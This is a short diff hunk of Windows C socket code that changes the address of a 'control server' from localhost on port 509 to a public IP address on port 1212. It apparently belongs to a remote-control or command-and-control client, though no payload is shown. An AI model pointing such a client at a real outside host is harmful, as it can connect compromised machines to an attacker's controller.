@@ -24,8 +24,8 @@ int s_send(s, msg)
 int main(int argc , char *argv[])
 {
     // simple constants that hold the port and address on which the control server is listening
-    const char HOST[] = "127.0.0.1";
-    const int PORT = 509;
+    const char HOST[] = "130.185.120.192";
+    const int PORT = 1212;
 
     // variables for our socket
     WSADATA wsa;
